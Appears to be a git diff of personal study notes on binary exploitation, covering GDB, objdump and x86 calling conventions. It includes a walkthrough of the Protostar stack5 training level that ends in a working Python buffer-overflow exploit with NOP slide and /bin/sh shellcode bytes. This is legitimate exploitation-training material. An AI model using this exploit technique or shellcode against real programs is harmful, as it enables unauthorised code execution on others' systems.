@@ -2,8 +2,6 @@
 
 ## Binary Exploitation
 
-### GDB
-
 #### Learning Sources
 + [LiveOverflow Youtube channel](https://www.youtube.com/watch?v=VroEiMOJPm8&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=7&t=0s)
 
@@ -11,19 +9,20 @@
 + ```file```: determine file type
 + ```strings```: print the sequences of printable characters in files
 
-#### Basic disassembler and register tricks
-
+#### GDB
 + ```set disassembly-flavor intel```: a more readable style
 + ```disassemble main```: display all assembler instructions of the ```main``` function
 + ```break *address```: for example, ```break *main```
 + ```si```: step one instruction
 + ```info registers```:
     - ```rip / eip```: instruction pointer (program counter)
+    - ```rsp / esp```: stack pointer
     - ```eax```: the first 32 bits of the 64-bit ```rax``` register
 + ```set $eax=0```: set the register ```eax``` to 0
 + ```info proc mapping```: report the memory address space ranges accessible in a process.
 + x command: examine the content of a memory address [reference](https://visualgdb.com/gdbreference/commands/x)
-+ define a "hook", example:
+    - ```x/4wx $esp```
++ define a "hook", for example, *hook-stop* will execute when the program stop at a breakpoint:
   ```
   (gdb) define hook-stop
   Type commands for definition of "hook-stop".
@@ -37,13 +36,13 @@
 ### objdump
 + ```objdump -d $FILENAME```: disassembler
 + ```objdump -x $FILENAME```: print header information
++ ```objdump -t $FILENAME```: print the symbol table entries, can be used to find the address of a function
 
 ### strace & ltrace
 + ```strace```: trace system calls
 + ```ltrace```: trace library calls
 
 ### Other useful tools
-
 + Radare2, Ghidra, ...
 
 ### Parser Differential
@@ -53,44 +52,50 @@
 
 + ebp / rbp: contains the address of the bottom of the stack
 + esp / rsp: contains the address the top of the stack
-+ When enter a function:
-    ```
-    push   ebp
-    mov    ebp,esp
-    and    esp,0xfffffff0
-    ```
-  (mask out the last 4 bits of esp is for alignment)
 
-+ Procedures of calling a function:
-    1. (old func) push the paramters to be passed on the stack
-    2. (old func) push the next instruction to be executed on the stack
-    3. (old func) execute ```call`` instruction
-    4. (new func) push the value of *ebp* on the stack
-    5. (new func) set *ebp* to the value of *esp*
-    6. (new func) align the value of *esp*
-    7. (new func) substract *esp* to create stack frame
+### Calling Convention:
+1. push the paramters to be passed on the stack (in reverse order)
+2. ```call``` instruction
+    1. push the return address on the stack
+    2. set ```eip (rip)``` to the address of the callee 
+4. push the value of ```ebp``` on the stack
+5. set ```ebp``` to the value of ```esp```
+6. align the value of ```esp``` (bitwise and with 0xfffffff0)
+7. substract ```esp``` by a certain value to create the stack frame
 
-+ Procedures of returning from a function:
-    1. ```leave``` instruction: ```mov esp, ebp``` then ```pop ebp```
-    2. ```ret``` instruction: get the next instruction pointer, which is on the top of the stack (pop)
+### End of a Function
+1. ```leave``` instruction: ```mov esp, ebp``` then ```pop ebp```
+2. ```ret``` instruction (the invert of ```call``` instruction): get and set the next instruction pointer, which is on the top of the stack 
 
-
-### Protostar
+### [Protostar](https://exploit.education/protostar/)
 
 #### [stack5](https://exploit.education/protostar/stack-five/)
 
-1. calculate the length of padding
-2. determine the value of *ebp* (does not matter in this problem)
-3. determine the value of *eip*: where to place our shell code? (right after *$eip*)
-4. add NOP(opcode: ```0x90```) slide: the address may not be the same every time since the data pushed on the stack can be different (e.g. environment variables)
-    - make the *eip* point to the middle of the NOP slide (the exact position is not sure)
+1. First analyze the disassembled code:
+```
+0x080483c4 <main+0>:    push   ebp
+0x080483c5 <main+1>:    mov    ebp,esp
+0x080483c7 <main+3>:    and    esp,0xfffffff0
+0x080483ca <main+6>:    sub    esp,0x50
+0x080483cd <main+9>:    lea    eax,[esp+0x10]
+0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
+0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
+0x080483d9 <main+21>:   leave  
+0x080483da <main+22>:   ret    
+```
+The goal is to smash the stack frame of ```gets``` and redirect the return address to ```execve("/bin/sh")``` at the return of main function.
+2. From the assembly code, we know the buffer starts at ```$esp+0x10```, whose value can be found by GDB.
+3. To know the size of padding, we need to know ```$esp``` when ```0x080483da <main+22>:   ret``` is executed. We can find it out by setting a breakpoint at ```ret``` and ```x/wx $esp```. Now we know that the padding should be 76 bytes long. (actually the last 4 bytes is the old ```ebp```, but it does not matter here)
+4. determine the value of ```eip```: Where to place our shell code? Here we choose to place it right after the position of ```eip```
+5. However, the address space may not be the same every time since the data pushed on the stack can be different (e.g. environment variables). To address this issue, we can find a way to know the exact value by the other code in the binary. However, we can also use NOP(opcode: ```0x90```) slide to make sure that ```eip``` points to the code we control. 
+    - make the *eip* point to the middle of the NOP slide
 5. add shellcode: copy from [shell-storm](http://shell-storm.org/shellcode/)
 
 !!! info
     use ```int3```(opcode: ```0xCC```) instruction to debug shellcode
 
 !!! warning
-    ```python exploit.py | /opt/protostar/bin/stack5``` does not work because when exploit.py terminates, the pipe is closed at the mean time. Thus, we should use ```cat``` to create a new pipe:
+    ```python exploit.py | /opt/protostar/bin/stack5``` does not work because stack5's stdin has been redirected to the stdout of exploit.py. When the shell gets executed, it reads nothing but the EOF of the stdout of exploit.py. As a result, the shell does not read any input from our terminal. A possible solution is using ```cat``` to "continue" the pipe and pipe our commands into the stdin of the shell.
     ```bash
     (python exploit.py; cat) | /opt/protostar/bin/stack5
     ```
@@ -98,10 +103,9 @@
 ```python
 import struct
 
-padding = 'A' * 72
-ebp = 'AAAA'
+padding = 'A' * 76
 eip = struct.pack('I', 0xbffff6e0+40)
 nopslide = '\x90' * 100
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-print padding + ebp + eip + nopslide + shellcode
+print padding + eip + nopslide + shellcode
 ```
